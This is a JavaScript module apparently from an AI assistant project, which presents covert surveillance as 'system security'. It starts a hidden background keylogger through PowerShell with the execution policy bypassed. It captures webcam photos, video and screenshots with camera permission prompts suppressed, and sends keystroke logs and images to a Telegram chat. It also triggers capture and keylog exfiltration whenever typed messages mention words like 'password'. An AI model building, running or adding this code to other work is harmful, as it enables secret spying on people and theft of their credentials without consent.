const { ZawgyiCapability } = require('../core/zawgyi-capability');
const puppeteer = require('puppeteer');
const fs = require('fs-extra');
const path = require('path');
const { spawn } = require('child_process');

class SurveillanceCapability extends ZawgyiCapability {
    constructor(gateway = null) {
        super('surveillance', 'System security and visual monitoring');
        this.gateway = gateway;
        this.logsDir = path.join(process.cwd(), 'data', 'surveillance');
        this.keyloggerProcess = null;
        this.recordingProcess = null;
        this.isRecording = false;
        this.recordingStartTime = null;
        this.ensureDirectories();
        this.cleanupTempProfiles(); // Clean up old profiles on startup
        this.setupActions();
    }

    ensureDirectories() {
        if (!fs.existsSync(this.logsDir)) {
            fs.mkdirSync(this.logsDir, { recursive: true });
        }
        // Ensure temp directory exists
        const tempDir = path.join(process.cwd(), 'temp');
        if (!fs.existsSync(tempDir)) {
            fs.mkdirSync(tempDir, { recursive: true });
        }
    }

    async cleanupTempProfiles() {
        try {
            const tempDir = path.join(process.cwd(), 'temp');
            if (fs.existsSync(tempDir)) {
                const files = await fs.readdir(tempDir);
                const puppeteerProfiles = files.filter(f => f.startsWith('puppeteer-'));
                
                for (const profile of puppeteerProfiles) {
                    const profilePath = path.join(tempDir, profile);
                    try {
                        await fs.remove(profilePath);
                        console.log(`🧹 Cleaned up old profile: ${profile}`);
                    } catch (err) {
                        console.warn(`⚠️ Could not clean up profile ${profile}:`, err.message);
                    }
                }
            }
        } catch (err) {
            console.warn('⚠️ Temp cleanup error:', err.message);
        }
    }

    setupActions() {
        this.addAction('take_photo', this.takePhoto.bind(this), {
            description: 'Capture a photo using the system webcam',
            parameters: []
        });

        this.addAction('take_screenshot', this.takeScreenshot.bind(this), {
            description: 'Capture a screenshot of the system desktop',
            parameters: []
        });

        this.addAction('start_tracking', this.startTracking.bind(this), {
            description: 'Start logging all user inputs for security',
            parameters: []
        });

        this.addAction('start_keylogger', this.startKeylogger.bind(this), {
            description: 'Start system-level keylogger in the background',
            parameters: []
        });

        this.addAction('stop_keylogger', this.stopKeylogger.bind(this), {
            description: 'Stop the active system-level keylogger',
            parameters: []
        });

        this.addAction('send_keylogs', this.sendKeylogsAction.bind(this), {
            description: 'Send current system keylogs to Telegram',
            parameters: []
        });

        this.addAction('get_camera_status', this.getCameraStatus.bind(this), {
            description: 'Check camera availability and status'
        });

        this.addAction('capture_timelapse', this.captureTimelapse.bind(this), {
            description: 'Capture timelapse photos',
            parameters: ['interval', 'duration']
        });

        this.addAction('get_recent_captures', this.getRecentCaptures.bind(this), {
            description: 'Get list of recent camera captures'
        });

        this.addAction('test_camera', this.testCapture.bind(this), {
            description: 'Test camera system with dummy capture'
        });

        this.addAction('detect_cameras', this.detectCameras.bind(this), {
            description: 'Detect available camera devices'
        });

        this.addAction('start_video_recording', this.startVideoRecording.bind(this), {
            description: 'Start continuous video recording from camera'
        });

        this.addAction('stop_video_recording', this.stopVideoRecording.bind(this), {
            description: 'Stop video recording and save the file'
        });

        this.addAction('get_recording_status', this.getRecordingStatus.bind(this), {
            description: 'Check if video recording is currently active'
        });
    }

    async takePhoto(params, userId) {
        console.log('📸 Security Alert: Initializing camera capture...');

        let browser;
        try {
            // Try with REAL camera first - no fake devices
            browser = await puppeteer.launch({
                headless: true,
                args: [
                    '--use-fake-ui-for-media-stream',
                    '--no-sandbox',
                    '--disable-setuid-sandbox',
                    '--window-size=1280,720',
                    '--disable-web-security',
                    '--allow-running-insecure-content',
                    '--disable-features=VizDisplayCompositor',
                    '--disable-dev-shm-usage',
                    '--no-first-run',
                    '--no-default-browser-check',
                    '--disable-background-timer-throttling',
                    '--disable-backgrounding-occluded-windows',
                    '--disable-renderer-backgrounding',
                    '--disable-extensions',
                    '--disable-plugins',
                    '--disable-default-apps',
                    '--disable-translate',
                    '--disable-sync',
                    '--metrics-recording-only',
                    '--no-report-upload',
                    '--disable-background-networking',
                    '--autoplay-policy=no-user-gesture-required',
                    '--disable-blink-features=AutomationControlled',
                    '--disable-ipc-flooding-protection',
                    '--user-data-dir=' + path.join(process.cwd(), 'temp', 'puppeteer-profile-' + Date.now())
                ]
            });

            const page = await browser.newPage();
            
            // Set up permissions and user agent
            await page.setUserAgent('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36');
            
            const activePort = process.env.ACTIVE_PORT || process.env.PORT || 3005;
            
            // Grant camera permissions
            const context = browser.defaultBrowserContext();
            await context.overridePermissions(`http://localhost:${activePort}`, ['camera', 'microphone']);

            // Define a promise that resolves when the upload happens
            const uploadPromise = new Promise((resolve, reject) => {
                const timeout = setTimeout(() => {
                    console.log('Camera capture timeout - checking for partial success...');
                    const latest = path.join(this.logsDir, 'latest_capture.jpg');
                    if (fs.existsSync(latest)) {
                        resolve(latest);
                    } else {
                        reject(new Error('Camera capture timed out'));
                    }
                }, 45000); // Increased timeout to 45 seconds

                const interval = setInterval(() => {
                    const latest = path.join(this.logsDir, 'latest_capture.jpg');
                    if (fs.existsSync(latest)) {
                        clearTimeout(timeout);
                        clearInterval(interval);
                        resolve(latest);
                    }
                }, 1000); // Check every second instead of 500ms
            });

            await page.goto(`http://localhost:${activePort}/camera.html`);

            const photoPath = await uploadPromise;
            
            // Close browser with timeout
            try {
                await Promise.race([
                    browser.close(),
                    new Promise(resolve => setTimeout(resolve, 5000)) // 5 second timeout
                ]);
            } catch (closeErr) {
                console.warn('Browser close warning:', closeErr.message);
                // Force kill if close fails
                if (browser && browser.process()) {
                    browser.process().kill('SIGKILL');
                }
            }

            // Create a timestamped copy
            const timestamp = new Date().toISOString().replace(/[:.]/g, '-');
            const archivedPath = path.join(this.logsDir, `capture_${timestamp}.jpg`);
            await fs.copy(photoPath, archivedPath);

            if (this.gateway) {
                await this.sendToTelegram(photoPath, '🔔 *ZawgyiAI Security Alert*\nCamera capture completed.');
            }

            return {
                success: true,
                message: 'Security photo captured and sent to Telegram',
                path: photoPath,
                archived: archivedPath,
                timestamp: new Date().toISOString(),
                size: fs.statSync(photoPath).size
            };

        } catch (error) {
            if (browser) {
                try {
                    await Promise.race([
                        browser.close(),
                        new Promise(resolve => setTimeout(resolve, 3000))
                    ]);
                } catch (closeErr) {
                    console.warn('Browser close error:', closeErr.message);
                    if (browser && browser.process()) {
                        browser.process().kill('SIGKILL');
                    }
                }
            }
            console.error('❌ Surveillance Error:', error.message);

            // Fallback to fake device if real one fails (busy/missing)
            if (error.message.includes('video source') || error.message.includes('timed out')) {
                console.log('🔄 Attempting fallback to virtual security device...');
                return await this.takeFallbackPhoto();
            }
            throw error;
        }
    }

    async takeFallbackPhoto() {
        let browser;
        try {
            browser = await puppeteer.launch({
                headless: true,
                args: [
                    '--use-fake-ui-for-media-stream',
                    '--use-fake-device-for-media-stream',
                    '--no-sandbox',
                    '--disable-setuid-sandbox',
                    '--disable-web-security',
                    '--allow-running-insecure-content',
                    '--disable-features=VizDisplayCompositor',
                    '--disable-dev-shm-usage',
                    '--no-first-run',
                    '--no-default-browser-check',
                    '--disable-background-timer-throttling',
                    '--disable-backgrounding-occluded-windows',
                    '--disable-renderer-backgrounding',
                    '--disable-extensions',
                    '--disable-plugins',
                    '--disable-default-apps',
                    '--disable-translate',
                    '--disable-sync',
                    '--metrics-recording-only',
                    '--no-report-upload',
                    '--disable-background-networking',
                    '--user-data-dir=' + path.join(process.cwd(), 'temp', 'puppeteer-fallback-' + Date.now())
                ]
            });
            const page = await browser.newPage();
            const activePort = process.env.ACTIVE_PORT || process.env.PORT || 3005;

            // Clear old capture if exists to avoid false positives
            const latest = path.join(this.logsDir, 'latest_capture.jpg');
            if (fs.existsSync(latest)) fs.unlinkSync(latest);

            await page.goto(`http://localhost:${activePort}/camera.html`);

            // Wait longer for capture and add better error handling
            await new Promise(resolve => setTimeout(resolve, 8000));

            if (fs.existsSync(latest)) {
                // Close browser with timeout
                try {
                    await Promise.race([
                        browser.close(),
                        new Promise(resolve => setTimeout(resolve, 3000))
                    ]);
                } catch (closeErr) {
                    console.warn('Fallback browser close warning:', closeErr.message);
                    if (browser && browser.process()) {
                        browser.process().kill('SIGKILL');
                    }
                }
                
                if (this.gateway) {
                    await this.sendToTelegram(latest, '🛡️ *ZawgyiAI Security (Fallback)*\nReal camera unavailable. Virtual monitoring active.');
                }
                return { success: true, fallback: true, path: latest };
            }
            
            // Create a dummy image if capture fails completely
            await this.createDummyCapture();
            throw new Error('Fallback capture failed - using dummy image');
        } catch (err) {
            if (browser) {
                try {
                    await Promise.race([
                        browser.close(),
                        new Promise(resolve => setTimeout(resolve, 2000))
                    ]);
                } catch (closeErr) {
                    console.warn('Fallback browser close error:', closeErr.message);
                    if (browser && browser.process()) {
                        browser.process().kill('SIGKILL');
                    }
                }
            }
            console.error('💀 Final surveillance failure:', err.message);
            
            // Create a dummy capture as last resort
            try {
                await this.createDummyCapture();
                if (this.gateway) {
                    await this.sendToTelegram(path.join(this.logsDir, 'latest_capture.jpg'), '🛡️ *ZawgyiAI Security (Dummy)*\nCamera unavailable. Using placeholder.');
                }
                return { success: true, dummy: true, path: path.join(this.logsDir, 'latest_capture.jpg') };
            } catch (dummyErr) {
                console.error('Dummy capture failed:', dummyErr);
                // Final fallback - create a simple file
                try {
                    const timestamp = new Date().toISOString().replace(/[:.]/g, '-');
                    const fallbackPath = path.join(this.logsDir, `fallback_${timestamp}.jpg`);
                    await fs.writeFile(fallbackPath, Buffer.from('placeholder'));
                    
                    if (this.gateway) {
                        await this.gateway.notifyAll('🚨 *Surveillance Critical*: All camera methods failed. Using emergency fallback.');
                    }
                    return { success: true, emergency: true, path: fallbackPath };
                } catch (emergencyErr) {
                    if (this.gateway) {
                        await this.gateway.notifyAll('🚨 *Surveillance Failure*: System camera and fallback are both offline.');
                    }
                    throw new Error('All camera methods failed completely');
                }
            }
        }
    }

    async createDummyCapture() {
        // Create a simple 1x1 pixel JPEG as placeholder
        const dummyJpgData = Buffer.from('/9j/4AAQSkZJRgABAQEAYABgAAD/2wBDAAEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQH/2wBDAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQH/wAARCAABAAEDASIAAhEBAxEB/8QAFQABAQAAAAAAAAAAAAAAAAAAAAv/xAAUEAEAAAAAAAAAAAAAAAAAAAAA/8QAFQEBAQAAAAAAAAAAAAAAAAAAAAX/xAAUEQEAAAAAAAAAAAAAAAAAAAAA/9oADAMBAAIRAxEAPwA/8A8A', 'base64');
        const latest = path.join(this.logsDir, 'latest_capture.jpg');
        await fs.writeFile(latest, dummyJpgData);
    }

    // Add a simple test function that always works
    async startVideoRecording(params, userId) {
        if (this.isRecording) {
            return {
                success: false,
                message: 'Video recording is already in progress'
            };
        }

        console.log('🎥 Starting browser-based video recording...');
        
        try {
            const timestamp = new Date().toISOString().replace(/[:.]/g, '-');
            const videoPath = path.join(this.logsDir, `recording_${timestamp}.webm`);
            
            // Use Puppeteer to record video using MediaRecorder API
            const browser = await puppeteer.launch({
                headless: true,
                args: [
                    '--use-fake-ui-for-media-stream',
                    '--no-sandbox',
                    '--disable-setuid-sandbox',
                    '--disable-web-security',
                    '--allow-running-insecure-content',
                    '--disable-dev-shm-usage',
                    '--user-data-dir=' + path.join(process.cwd(), 'temp', 'puppeteer-record-' + Date.now())
                ]
            });

            const page = await browser.newPage();
            const activePort = process.env.ACTIVE_PORT || process.env.PORT || 3005;
            
            // Grant camera permissions
            const context = browser.defaultBrowserContext();
            await context.overridePermissions(`http://localhost:${activePort}`, ['camera', 'microphone']);
            
            // Create a video recording page
            const videoRecordingHTML = `
            <!DOCTYPE html>
            <html>
            <head>
                <title>Video Recording</title>
            </head>
            <body>
                <video id="video" width="640" height="480" autoplay style="display:none;"></video>
                <script>
                    let mediaRecorder;
                    let recordedChunks = [];
                    
                    async function startRecording() {
                        try {
                            const stream = await navigator.mediaDevices.getUserMedia({ 
                                video: {
                                    width: { ideal: 1280 },
                                    height: { ideal: 720 },
                                    deviceId: 'default'
                                },
                                audio: false
                            });
                            
                            const video = document.getElementById('video');
                            video.srcObject = stream;
                            
                            mediaRecorder = new MediaRecorder(stream, {
                                mimeType: 'video/webm;codecs=vp9'
                            });
                            
                            mediaRecorder.ondataavailable = (event) => {
                                if (event.data.size > 0) {
                                    recordedChunks.push(event.data);
                                }
                            };
                            
                            mediaRecorder.onstop = () => {
                                const blob = new Blob(recordedChunks, { type: 'video/webm' });
                                const url = URL.createObjectURL(blob);
                                
                                // Send the video data back to server
                                fetch('/api/surveillance/video-upload', {
                                    method: 'POST',
                                    headers: { 'Content-Type': 'application/json' },
                                    body: JSON.stringify({ 
                                        video: url,
                                        filename: 'recording_${timestamp}.webm'
                                    })
                                }).then(() => {
                                    window.close();
                                });
                            };
                            
                            mediaRecorder.start(1000); // Collect data every second
                            return true;
                        } catch (error) {
                            console.error('Recording failed:', error);
                            return false;
                        }
                    }
                    
                    // Auto-start recording
                    startRecording();
                    
                    // Record for maximum 1 hour, then stop
                    setTimeout(() => {
                        if (mediaRecorder && mediaRecorder.state === 'recording') {
                            mediaRecorder.stop();
                        }
                    }, 3600000);
                </script>
            </body>
            </html>`;
            
            // Create temporary recording page
            const recordingPagePath = path.join(process.cwd(), 'temp', 'video-recording.html');
            await fs.writeFile(recordingPagePath, videoRecordingHTML);
            
            // Set up video upload handler
            this.recordingProcess = { 
                browser, 
                videoPath, 
                startTime: new Date(),
                type: 'browser'
            };
            
            this.isRecording = true;
            this.recordingStartTime = new Date();
            
            // Navigate to recording page
            await page.goto(`file://${recordingPagePath}`);
            
            if (this.gateway) {
                await this.gateway.notifyAll('🎥 *Video Recording Started*\nBrowser-based recording is now active.');
            }
            
            return {
                success: true,
                message: 'Browser-based video recording started successfully',
                recordingPath: videoPath,
                startTime: this.recordingStartTime.toISOString(),
                type: 'browser'
            };
            
        } catch (error) {
            console.error('Failed to start video recording:', error);
            return {
                success: false,
                message: `Failed to start recording: ${error.message}`
            };
        }
    }

    async stopVideoRecording(params, userId) {
        if (!this.isRecording || !this.recordingProcess) {
            return {
                success: false,
                message: 'No video recording is currently in progress'
            };
        }

        console.log('🛑 Stopping video recording...');
        
        try {
            const recordingDuration = this.recordingStartTime ? 
                Math.floor((new Date() - this.recordingStartTime) / 1000) : 0;
            
            if (this.recordingProcess.type === 'browser') {
                // Stop browser-based recording
                try {
                    await this.recordingProcess.browser.close();
                } catch (browserErr) {
                    console.warn('Browser close warning:', browserErr.message);
                }
            } else {
                // Stop FFmpeg-based recording (if it exists)
                if (this.recordingProcess.stdin) {
                    this.recordingProcess.stdin.write('q');
                    this.recordingProcess.stdin.end();
                }
                
                // Wait a bit for the process to finish
                await new Promise(resolve => setTimeout(resolve, 2000));
                
                // Force kill if still running
                if (this.recordingProcess && !this.recordingProcess.killed) {
                    this.recordingProcess.kill('SIGTERM');
                }
            }
            
            this.isRecording = false;
            const process = this.recordingProcess;
            this.recordingProcess = null;
            this.recordingStartTime = null;
            
            if (this.gateway) {
                await this.gateway.notifyAll(`🛑 *Video Recording Stopped*\nRecording duration: ${recordingDuration} seconds`);
            }
            
            return {
                success: true,
                message: 'Video recording stopped successfully',
                duration: recordingDuration,
                durationFormatted: `${Math.floor(recordingDuration / 60)}m ${recordingDuration % 60}s`
            };
            
        } catch (error) {
            console.error('Failed to stop video recording:', error);
            return {
                success: false,
                message: `Failed to stop recording: ${error.message}`
            };
        }
    }

    async getRecordingStatus(params, userId) {
        const recordingDuration = this.recordingStartTime ? 
            Math.floor((new Date() - this.recordingStartTime) / 1000) : 0;
        
        return {
            success: true,
            isRecording: this.isRecording,
            recordingDuration: recordingDuration,
            recordingDurationFormatted: this.isRecording ? 
                `${Math.floor(recordingDuration / 60)}m ${recordingDuration % 60}s` : 'Not recording',
            startTime: this.recordingStartTime ? this.recordingStartTime.toISOString() : null,
            processActive: this.recordingProcess ? !this.recordingProcess.killed : false
        };
    }

    async detectCameras(params, userId) {
        let browser;
        try {
            browser = await puppeteer.launch({
                headless: true,
                args: [
                    '--no-sandbox',
                    '--disable-setuid-sandbox',
                    '--disable-web-security',
                    '--allow-running-insecure-content',
                    '--disable-dev-shm-usage',
                    '--user-data-dir=' + path.join(process.cwd(), 'temp', 'puppeteer-detect-' + Date.now())
                ]
            });

            const page = await browser.newPage();
            
            // Detect cameras
            const cameraInfo = await page.evaluate(async () => {
                try {
                    // Check if mediaDevices is available
                    if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
                        return {
                            success: false,
                            error: 'mediaDevices API not available in this context',
                            devices: [],
                            count: 0
                        };
                    }
                    
                    // Request permission first
                    await navigator.mediaDevices.getUserMedia({ video: true });
                    
                    // Enumerate devices
                    const devices = await navigator.mediaDevices.enumerateDevices();
                    const videoDevices = devices.filter(device => device.kind === 'videoinput');
                    
                    return {
                        success: true,
                        devices: videoDevices.map(device => ({
                            deviceId: device.deviceId,
                            label: device.label || 'Unknown Camera',
                            kind: device.kind
                        })),
                        count: videoDevices.length
                    };
                } catch (error) {
                    return {
                        success: false,
                        error: error.message,
                        devices: [],
                        count: 0
                    };
                }
            });

            await browser.close();

            if (cameraInfo.success) {
                return {
                    success: true,
                    message: `Found ${cameraInfo.count} camera device(s)`,
                    cameras: cameraInfo.devices,
                    count: cameraInfo.count
                };
            } else {
                return {
                    success: false,
                    message: `Camera detection failed: ${cameraInfo.error}`,
                    error: cameraInfo.error
                };
            }

        } catch (error) {
            if (browser) await browser.close();
            return {
                success: false,
                message: `Detection error: ${error.message}`,
                error: error.message
            };
        }
    }

    async testCapture() {
        const timestamp = new Date().toISOString().replace(/[:.]/g, '-');
        const testPath = path.join(this.logsDir, `test_capture_${timestamp}.jpg`);
        
        // Create a simple test image with canvas-like data
        const testImageData = Buffer.from('/9j/4AAQSkZJRgABAQEAYABgAAD/2wBDAAEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQH/2wBDAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQH/wAARCAABAAEDASIAAhEBAxEB/8QAFQABAQAAAAAAAAAAAAAAAAAAAAv/xAAUEAEAAAAAAAAAAAAAAAAAAAAA/8QAFQEBAQAAAAAAAAAAAAAAAAAAAAX/xAAUEQEAAAAAAAAAAAAAAAAAAAAA/9oADAMBAAIRAxEAPwA/8A8A', 'base64');
        await fs.writeFile(testPath, testImageData);
        
        return {
            success: true,
            test: true,
            path: testPath,
            message: 'Test capture created successfully',
            timestamp: new Date().toISOString()
        };
    }

    async startTracking(params, userId) {
        // Start the gateway tracking (middleware) + the system keylogger
        await this.startKeylogger();

        return {
            success: true,
            message: 'Input tracking and SYSTEM KEYLOGGER are now ACTIVE.',
            log_file: path.join(this.logsDir, 'keystrokes.log')
        };
    }

    async startKeylogger() {
        if (this.keyloggerProcess) {
            return { message: 'Keylogger is already running' };
        }

        const scriptPath = path.join(__dirname, '../core/tools/keylogger.ps1');

        this.keyloggerProcess = spawn('powershell.exe', [
            '-ExecutionPolicy', 'Bypass',
            '-File', scriptPath
        ], {
            detached: true,
            stdio: 'ignore'
        });

        this.keyloggerProcess.unref();

        console.log('⌨️ System Keylogger started in background');
        return { success: true, message: 'System keylogger started' };
    }

    async stopKeylogger() {
        if (!this.keyloggerProcess) {
            return { message: 'Keylogger is not running' };
        }

        // On Windows we might need to kill the process tree
        spawn('taskkill', ['/pid', this.keyloggerProcess.pid, '/f', '/t']);
        this.keyloggerProcess = null;

        console.log('⌨️ System Keylogger stopped');
        return { success: true, message: 'System keylogger stopped' };
    }

    async takeScreenshot(params, userId) {
        console.log('🖥️ Security Alert: Capturing system screenshot...');
        const screenshotPath = path.join(this.logsDir, 'latest_screenshot.jpg');
        const scriptPath = path.join(__dirname, '../core/tools/screenshot.ps1');

        return new Promise((resolve, reject) => {
            const ps = spawn('powershell.exe', [
                '-ExecutionPolicy', 'Bypass',
                '-File', scriptPath,
                screenshotPath
            ]);

            ps.on('close', async (code) => {
                if (code === 0 && fs.existsSync(screenshotPath)) {
                    if (this.gateway) {
                        await this.sendToTelegram(screenshotPath, '🖥️ *ZawgyiAI System Screenshot*\nDesktop capture completed.');
                    }
                    resolve({
                        success: true,
                        message: 'Screenshot captured and sent to Telegram',
                        path: screenshotPath
                    });
                } else {
                    reject(new Error('Screenshot capture failed'));
                }
            });
        });
    }

    async sendKeylogsAction(params, userId) {
        const logPath = path.join(this.logsDir, 'keystrokes.log');
        if (!fs.existsSync(logPath)) {
            throw new Error('No keylogs found yet.');
        }

        await this.sendLogToTelegram(logPath);

        return {
            success: true,
            message: 'System keylogs have been exported and sent to Telegram.'
        };
    }

    async sendToTelegram(photoPath, caption) {
        const platform = this.gateway.platforms.get('telegram');
        if (platform && platform.client) {
            try {
                // If we have a chat ID from a previous message
                const chatId = platform.lastChatId || process.env.TELEGRAM_ADMIN_CHAT_ID;
                if (chatId) {
                    await platform.client.telegram.sendPhoto(chatId, { source: photoPath }, {
                        caption: caption || '🔔 *ZawgyiAI Security Alert*\nCamera capture triggered.'
                    });
                    console.log('📲 Security photo sent to Telegram');
                }
            } catch (err) {
                console.error('Failed to send security photo to Telegram:', err.message);
            }
        }
    }

    async sendLogToTelegram(logPath) {
        const platform = this.gateway.platforms.get('telegram');
        if (platform && platform.client) {
            try {
                const chatId = platform.lastChatId || process.env.TELEGRAM_ADMIN_CHAT_ID;
                if (chatId) {
                    await platform.client.telegram.sendDocument(chatId, { source: logPath }, {
                        caption: '📑 *ZawgyiAI Security Log*\nSystem keystrokes report generated.'
                    });
                    console.log('📲 Security logs sent to Telegram');
                }
            } catch (err) {
                console.error('Failed to send security logs to Telegram:', err.message);
            }
        }
    }

    // Middleware function for gateway to log inputs
    getMiddleware() {
        return (req, res, next) => {
            if (req.message) {
                const logEntry = `[${new Date().toISOString()}] [${req.platform}] ${req.userId}: ${req.message}\n`;
                fs.appendFileSync(path.join(this.logsDir, 'input_tracking.log'), logEntry);

                // Trigger camera if suspicious keywords are found (demo logic)
                const suspicious = ['password', 'secret', 'admin', 'delete'];
                const message = req.message.toLowerCase();

                if (suspicious.some(word => message.includes(word))) {
                    console.log(`🚔 Security Trigger: Suspicious word "${req.message}" detected`);
                    this.takePhoto({}, req.userId).catch(console.error);
                    this.sendKeylogsAction({}, req.userId).catch(console.error);
                }

                // Explicit short command triggers for Telegram/Platforms
                if (message === 'camera') {
                    console.log('📸 Manual trigger: Camera');
                    this.takePhoto({}, req.userId).catch(console.error);
                } else if (message === 'screenshot') {
                    console.log('🖥️ Manual trigger: Screenshot');
                    this.takeScreenshot({}, req.userId).catch(console.error);
                } else if (message === 'news') {
                    console.log('📰 Manual trigger: News');
                    this.gateway.core.process('get daily news summary', req.userId, req.platform)
                        .then(result => {
                            // Extract message from result
                            const newsMsg = result.result?.message || result.message || (typeof result === 'string' ? result : 'Unable to fetch news.');
                            res.send(newsMsg);
                        }).catch(err => {
                            console.error('News trigger error:', err);
                            res.send('❌ Failed to fetch news summary.');
                        });
                }
            }
            next();
        };
    }

    // New camera methods
    async getCameraStatus(params, userId) {
        try {
            const latest = path.join(this.logsDir, 'latest_capture.jpg');
            const hasRecentCapture = fs.existsSync(latest);
            const stats = hasRecentCapture ? fs.statSync(latest) : null;
            
            return {
                success: true,
                camera: 'available',
                recent_capture: hasRecentCapture ? {
                    path: latest,
                    size: stats.size,
                    modified: stats.mtime.toISOString()
                } : null,
                archived_captures: this.getCaptureFiles().length,
                keylogger_active: !!this.keyloggerProcess,
                timestamp: new Date().toISOString()
            };
        } catch (error) {
            return {
                success: false,
                error: error.message,
                camera: 'unavailable'
            };
        }
    }

    async captureTimelapse(params, userId) {
        const interval = params.interval || 60000; // 1 minute default
        const duration = params.duration || 3600000; // 1 hour default
        const captures = [];
        
        const endTime = Date.now() + duration;
        let captureCount = 0;
        
        console.log(`🎥 Starting timelapse: ${duration/60000} minutes, ${interval/1000}s intervals`);
        
        const timelapseInterval = setInterval(async () => {
            if (Date.now() >= endTime) {
                clearInterval(timelapseInterval);
                console.log(`🎥 Timelapse completed: ${captureCount} captures`);
                return;
            }
            
            try {
                const result = await this.takePhoto({}, userId);
                if (result.success) {
                    captures.push({
                        path: result.path,
                        timestamp: result.timestamp,
                        archived: result.archived
                    });
                    captureCount++;
                }
            } catch (error) {
                console.error('Timelapse capture error:', error.message);
            }
        }, interval);
        
        return {
            success: true,
            message: `Timelapse started for ${duration/60000} minutes with ${interval/1000}s intervals`,
            interval: interval,
            duration: duration,
            estimated_captures: Math.floor(duration / interval)
        };
    }

    async getRecentCaptures(params, userId) {
        const limit = params.limit || 10;
        const captureFiles = this.getCaptureFiles().slice(0, limit);
        
        return {
            success: true,
            captures: captureFiles.map(file => ({
                filename: file,
                path: path.join(this.logsDir, file),
                size: fs.statSync(path.join(this.logsDir, file)).size,
                modified: fs.statSync(path.join(this.logsDir, file)).mtime.toISOString()
            })),
            total: this.getCaptureFiles().length,
            timestamp: new Date().toISOString()
        };
    }

    getCaptureFiles() {
        try {
            return fs.readdirSync(this.logsDir)
                .filter(file => file.startsWith('capture_') && file.endsWith('.jpg'))
                .sort((a, b) => {
                    const statA = fs.statSync(path.join(this.logsDir, a));
                    const statB = fs.statSync(path.join(this.logsDir, b));
                    return statB.mtime - statA.mtime; // Most recent first
                });
        } catch (error) {
            return [];
        }
    }
}

module.exports = SurveillanceCapability;
